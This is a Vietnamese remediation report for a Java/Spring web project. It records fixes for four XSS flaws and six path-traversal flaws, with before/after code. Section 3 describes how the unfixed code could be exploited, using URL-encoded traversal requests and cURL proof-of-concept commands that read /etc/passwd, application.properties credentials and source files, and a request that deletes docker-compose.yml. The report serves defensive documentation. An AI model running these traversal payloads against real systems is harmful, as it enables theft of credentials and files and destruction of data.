# Báo cáo sửa lỗi XSS & Path Traversal — Wave 3

**Ngày:** 2026-04-14  
**Phạm vi:** `final_web_v4/Web_Security`  
**Loại lỗ hổng:** Stored/DOM XSS (4 file JSP) + Path Traversal (6 file Java)  
**Thư viện thêm:** `commons-io:commons-io:2.18.0` (pom.xml)

---

## 1. XSS — Các vị trí đã sửa

### 1.1 `order.jsp` — DOM-based XSS (Stored source)

**File:** `src/main/resources/META-INF/resources/WEB-INF/views/user/order.jsp`  
**Dòng:** 460–462

| Trước khi sửa                                            | Sau khi sửa                                                          |
| -------------------------------------------------------- | -------------------------------------------------------------------- |
| `'<img ... alt="' + item.name + '">'`                    | `'<img ... alt="' + escapeHtml(item.name) + '">'`                    |
| `'<div class="order-item-name">' + item.name + '</div>'` | `'<div class="order-item-name">' + escapeHtml(item.name) + '</div>'` |

**Giải thích:** `item.name` lấy từ `sessionStorage` (nguồn gốc từ database) được chèn thẳng vào `innerHTML` mà không escape. Nếu tên sản phẩm chứa `<script>` hoặc `<img onerror=...>`, mã độc sẽ thực thi.

---

### 1.2 `order_backup.jsp` — DOM-based XSS (Stored source)

**File:** `src/main/resources/META-INF/resources/WEB-INF/views/user/order_backup.jsp`  
**Dòng:** 451–455

| Trước khi sửa                                            | Sau khi sửa                                                          |
| -------------------------------------------------------- | -------------------------------------------------------------------- |
| `'<img ... alt="' + item.name + '">'`                    | `'<img ... alt="' + escapeHtml(item.name) + '">'`                    |
| `'<div class="order-item-name">' + item.name + '</div>'` | `'<div class="order-item-name">' + escapeHtml(item.name) + '</div>'` |

**Giải thích:** Pattern giống hệt `order.jsp`. `item.name` từ sessionStorage → innerHTML.

---

### 1.3 `order_create.jsp` — DOM-based XSS (Stored source)

**File:** `src/main/resources/META-INF/resources/WEB-INF/views/user/order_create.jsp`  
**Dòng:** 402

| Trước khi sửa                                    | Sau khi sửa                                                  |
| ------------------------------------------------ | ------------------------------------------------------------ |
| `'<p class="item-name">' + productName + '</p>'` | `'<p class="item-name">' + escapeHtml(productName) + '</p>'` |

**Giải thích:** `productName` = `item.productName` (từ API response) được chèn vào innerHTML. Biến `productName` có thể chứa HTML nếu tên sản phẩm trong DB bị inject.

---

### 1.4 `product-reviews.jsp` — Reflected XSS

**File:** `src/main/resources/META-INF/resources/WEB-INF/views/reviews/product-reviews.jsp`  
**Dòng:** 5, 8

| Dòng | Trước khi sửa                                     | Sau khi sửa                                                        |
| ---- | ------------------------------------------------- | ------------------------------------------------------------------ |
| 5    | `<title>Reviews for product ${productId}</title>` | `<title>Reviews for product <c:out value="${productId}"/></title>` |
| 8    | `<h1>Reviews for product ${productId}</h1>`       | `<h1>Reviews for product <c:out value="${productId}"/></h1>`       |

**Giải thích:** `${productId}` từ model attribute (controller bind từ `@PathVariable Long productId`). Mặc dù kiểu `Long` hạn chế injection, nhưng EL expression `${}` trong JSP KHÔNG tự động escape HTML. Sử dụng `<c:out>` đảm bảo defense-in-depth.

---

## 2. Path Traversal — Các vị trí đã sửa

### Mô tả chung

Tất cả 4 Storage Service và `DocumentService` đều có hàm `read()` và `delete()` nhận `filename` từ user input và resolve trực tiếp vào thư mục gốc mà **KHÔNG kiểm tra** xem đường dẫn kết quả có nằm trong thư mục cho phép hay không. Ngoài ra `MediaServeController` là entry point HTTP nhận filename từ URL path.

**Dependency thêm vào `pom.xml`:**

```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.18.0</version>
</dependency>
```

**Pattern lỗi (giống nhau ở cả 4 storage service):**

```java
// TRƯỚC KHI SỬA - VULNERABLE
public byte[] read(String filename) throws IOException {
    Path path = root.resolve(filename);  // ← filename chứa "../" sẽ thoát thư mục!
    if (!Files.exists(path)) {
        throw new FileNotFoundException("...");
    }
    return Files.readAllBytes(path);     // ← Đọc file bất kỳ trên hệ thống
}

public boolean delete(String filename) throws IOException {
    return Files.deleteIfExists(root.resolve(filename));  // ← Xóa file bất kỳ!
}
```

**Pattern sửa — `FilenameUtils.getName()` (áp dụng cho cả 4 storage service):**

```java
// SAU KHI SỬA - SAFE
import org.apache.commons.io.FilenameUtils;

public byte[] read(String filename) throws IOException {
    String safeName = FilenameUtils.getName(filename);  // ← Strip toàn bộ directory path
    Path path = root.resolve(safeName);
    if (!Files.exists(path)) {
        throw new FileNotFoundException("...");
    }
    return Files.readAllBytes(path);
}

public boolean delete(String filename) throws IOException {
    String safeName = FilenameUtils.getName(filename);
    return Files.deleteIfExists(root.resolve(safeName));
}
```

**Cách hoạt động:**

- `FilenameUtils.getName("../../../../etc/passwd")` → `"passwd"`
- `FilenameUtils.getName("..\\..\\Windows\\win.ini")` → `"win.ini"`
- `FilenameUtils.getName("normal-image.png")` → `"normal-image.png"`

Strip toàn bộ directory component (`/`, `\`, `..`), chỉ giữ lại tên file thuần. File `passwd` hoặc `win.ini` không tồn tại trong thư mục upload → trả 404.

### 2.1 `MediaStorageService.java`

**File:** `src/main/java/com/proj/webprojrct/storage/service/MediaStorageService.java`

| Vị trí     | Dòng | Nội dung                                               |
| ---------- | ---- | ------------------------------------------------------ |
| import     | 4    | `import org.apache.commons.io.FilenameUtils;`          |
| `read()`   | 61   | `String safeName = FilenameUtils.getName(filename);`   |
| `read()`   | 62   | `Path path = root.resolve(safeName);`                  |
| `delete()` | 71   | `String safeName = FilenameUtils.getName(filename);`   |
| `delete()` | 72   | `return Files.deleteIfExists(root.resolve(safeName));` |

### 2.2 `AvatarStorageService.java`

**File:** `src/main/java/com/proj/webprojrct/storage/service/AvatarStorageService.java`

| Vị trí     | Dòng | Nội dung                                               |
| ---------- | ---- | ------------------------------------------------------ |
| import     | 4    | `import org.apache.commons.io.FilenameUtils;`          |
| `read()`   | 54   | `String safeName = FilenameUtils.getName(filename);`   |
| `read()`   | 55   | `Path path = root.resolve(safeName);`                  |
| `delete()` | 63   | `String safeName = FilenameUtils.getName(filename);`   |
| `delete()` | 64   | `return Files.deleteIfExists(root.resolve(safeName));` |

### 2.3 `ProductStorageService.java`

**File:** `src/main/java/com/proj/webprojrct/storage/service/ProductStorageService.java`

| Vị trí     | Dòng | Nội dung                                               |
| ---------- | ---- | ------------------------------------------------------ |
| import     | 15   | `import org.apache.commons.io.FilenameUtils;`          |
| `read()`   | 56   | `String safeName = FilenameUtils.getName(filename);`   |
| `read()`   | 57   | `Path path = root.resolve(safeName);`                  |
| `delete()` | 65   | `String safeName = FilenameUtils.getName(filename);`   |
| `delete()` | 66   | `return Files.deleteIfExists(root.resolve(safeName));` |

### 2.4 `DocumentStorageService.java`

**File:** `src/main/java/com/proj/webprojrct/storage/service/DocumentStorageService.java`

| Vị trí     | Dòng | Nội dung                                               |
| ---------- | ---- | ------------------------------------------------------ |
| import     | 15   | `import org.apache.commons.io.FilenameUtils;`          |
| `read()`   | 56   | `String safeName = FilenameUtils.getName(filename);`   |
| `read()`   | 57   | `Path path = root.resolve(safeName);`                  |
| `delete()` | 65   | `String safeName = FilenameUtils.getName(filename);`   |
| `delete()` | 66   | `return Files.deleteIfExists(root.resolve(safeName));` |

### 2.5 `DocumentService.java` — `deleteImage()`

**File:** `src/main/java/com/proj/webprojrct/document/service/DocumentService.java`

| Vị trí          | Dòng | Nội dung                                                  |
| --------------- | ---- | --------------------------------------------------------- |
| import          | 11   | `import org.apache.commons.io.FilenameUtils;`             |
| `deleteImage()` | 148  | `String safeName = FilenameUtils.getName(fileName);`      |
| `deleteImage()` | 149  | `Path filePath = Paths.get(uploadDir).resolve(safeName);` |

**Trước:**

```java
public void deleteImage(String fileName) {
    try {
        Path filePath = Paths.get(uploadDir).resolve(fileName);  // ← Không validate!
        ...
    }
}
```

**Sau:**

```java
public void deleteImage(String fileName) {
    try {
        String safeName = FilenameUtils.getName(fileName);
        Path filePath = Paths.get(uploadDir).resolve(safeName);
        ...
    }
}
```

### 2.6 `MediaServeController.java` — Entry Point HTTP

**File:** `src/main/java/com/proj/webprojrct/storage/controller/MediaServeController.java`

| Vị trí    | Dòng | Nội dung                                             |
| --------- | ---- | ---------------------------------------------------- |
| import    | 13   | `import org.apache.commons.io.FilenameUtils;`        |
| `serve()` | 24   | `String safeName = FilenameUtils.getName(filename);` |
| `serve()` | 26   | `byte[] data = mediaStorageService.read(safeName);`  |
| `serve()` | 28   | `String lc = safeName.toLowerCase();`                |

**Trước:**

```java
@GetMapping("/media/{filename}")
public ResponseEntity<byte[]> serve(@PathVariable String filename) {
    try {
        byte[] data = mediaStorageService.read(filename);  // ← filename thẳng từ URL
        String lc = filename.toLowerCase();
```

**Sau:**

```java
@GetMapping("/media/{filename}")
public ResponseEntity<byte[]> serve(@PathVariable String filename) {
    String safeName = FilenameUtils.getName(filename);  // ← Sanitize ngay tại controller
    try {
        byte[] data = mediaStorageService.read(safeName);
        String lc = safeName.toLowerCase();
```

---

## 3. Kịch bản khai thác Path Traversal (TRƯỚC khi sửa)

### 3.1 Entry Point

**URL:** `GET /media/{filename}`  
**Controller:** `MediaServeController.java`

```java
@GetMapping("/media/{filename}")
public ResponseEntity<byte[]> serve(@PathVariable String filename) {
    byte[] data = mediaStorageService.read(filename);  // ← filename từ URL
    // ...
}
```

### 3.2 Kịch bản 1: Đọc file nhạy cảm (Information Disclosure)

**Mục tiêu:** Đọc file `/etc/passwd` (Linux) hoặc `C:\Windows\win.ini` (Windows)

#### Linux

```
GET /media/..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: target.com
```

Hoặc dùng double encoding:

```
GET /media/....//....//....//....//etc/passwd HTTP/1.1
Host: target.com
```

**Luồng xử lý bên trong:**

```
filename = "../../../../etc/passwd"
root = /app/uploads/media/
root.resolve("../../../../etc/passwd") = /etc/passwd    ← THOÁT KHỎI THƯ MỤC!
Files.readAllBytes(/etc/passwd) → trả về nội dung file
```

**Kết quả trả về:**

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

#### Windows

```
GET /media/..%2F..%2F..%2F..%2FWindows%2Fwin.ini HTTP/1.1
Host: target.com
```

### 3.3 Kịch bản 2: Đọc file cấu hình ứng dụng (Critical)

**Mục tiêu:** Đọc `application.properties` chứa database credentials, API keys

```
GET /media/..%2F..%2F..%2Fsrc%2Fmain%2Fresources%2Fapplication.properties HTTP/1.1
Host: target.com
```

**Kết quả dự kiến:**

```
spring.datasource.url=jdbc:mysql://localhost:3307/web_security
spring.datasource.username=root
spring.datasource.password=abc123
speed.sms.access.token=REAL_API_TOKEN_HERE
```

→ Attacker lấy được **database credentials** và **SMS API token**.

### 3.4 Kịch bản 3: Đọc source code Java (Reverse Engineering)

```
GET /media/..%2F..%2F..%2Fsrc%2Fmain%2Fjava%2Fcom%2Fproj%2Fwebprojrct%2Fconfig%2FSecurityConfig.java HTTP/1.1
```

→ Attacker đọc được toàn bộ security configuration, tìm thêm lỗ hổng.

### 3.5 Kịch bản 4: Xóa file quan trọng (Denial of Service)

Nếu attacker tìm được endpoint gọi `delete()` (ví dụ: admin delete media), có thể xóa file hệ thống:

```
DELETE /admin/media/..%2F..%2F..%2F..%2Fapp%2Fdocker-compose.yml
```

→ Xóa file quan trọng, gây gián đoạn dịch vụ.

### 3.6 Proof of Concept — cURL

```bash
# 1. Đọc /etc/passwd
curl -v "http://localhost:8080/media/..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# 2. Đọc application.properties
curl -v "http://localhost:8080/media/..%2F..%2F..%2Fsrc%2Fmain%2Fresources%2Fapplication.properties"

# 3. Đọc database init script
curl -v "http://localhost:8080/media/..%2F..%2Fdb%2Finit.sql"
```

### 3.7 Sau khi sửa — `FilenameUtils.getName()`

```
GET /media/..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
```

**Luồng xử lý:**

```
filename = "../../../../etc/passwd"

// Controller: MediaServeController.java L24
safeName = FilenameUtils.getName("../../../../etc/passwd") = "passwd"

// Service: MediaStorageService.java L61
safeName = FilenameUtils.getName("passwd") = "passwd"  // (đã clean từ controller)
path = root.resolve("passwd") = /app/uploads/media/passwd

Files.exists(/app/uploads/media/passwd) → false
→ throw FileNotFoundException
```

**HTTP Response:**

```
HTTP/1.1 404 Not Found
```

→ `FilenameUtils.getName()` strip hết `../../`, chỉ giữ `"passwd"`. File này không tồn tại trong thư mục media → 404. Attacker **không thể** đọc bất kỳ file nào ngoài thư mục upload.

---

## 4. Tóm tắt

| #   | File                          | Loại lỗi                     | Mức độ       | Dòng đã sửa        | Trạng thái |
| --- | ----------------------------- | ---------------------------- | ------------ | ------------------ | ---------- |
| 1   | `order.jsp`                   | DOM XSS (Stored source)      | HIGH         | L460, L462         | ✅ Đã sửa  |
| 2   | `order_backup.jsp`            | DOM XSS (Stored source)      | HIGH         | L451, L453         | ✅ Đã sửa  |
| 3   | `order_create.jsp`            | DOM XSS (Stored source)      | HIGH         | L402               | ✅ Đã sửa  |
| 4   | `product-reviews.jsp`         | Reflected XSS                | LOW          | L5, L8             | ✅ Đã sửa  |
| 5   | `MediaStorageService.java`    | Path Traversal               | **CRITICAL** | L4, L61, L71–72    | ✅ Đã sửa  |
| 6   | `AvatarStorageService.java`   | Path Traversal               | **CRITICAL** | L4, L54, L63–64    | ✅ Đã sửa  |
| 7   | `ProductStorageService.java`  | Path Traversal               | **CRITICAL** | L15, L56, L65–66   | ✅ Đã sửa  |
| 8   | `DocumentStorageService.java` | Path Traversal               | **CRITICAL** | L15, L56, L65–66   | ✅ Đã sửa  |
| 9   | `DocumentService.java`        | Path Traversal               | **CRITICAL** | L11, L148–149      | ✅ Đã sửa  |
| 10  | `MediaServeController.java`   | Path Traversal (entry point) | **CRITICAL** | L13, L24, L26, L28 | ✅ Đã sửa  |

**Tổng:** 4 XSS + 6 Path Traversal = **10 lỗ hổng đã sửa** (trên 10 file)

### Kỹ thuật sửa

| Loại                            | Kỹ thuật                                                    | Thư viện            |
| ------------------------------- | ----------------------------------------------------------- | ------------------- |
| DOM XSS (JSP client-side)       | `escapeHtml()` từ `security-utils.js` (global via SiteMesh) | Tự viết             |
| Reflected XSS (JSP server-side) | `<c:out value="..."/>` — JSTL auto-escape                   | JSTL                |
| Path Traversal                  | `FilenameUtils.getName()` — strip toàn bộ directory path    | `commons-io:2.18.0` |
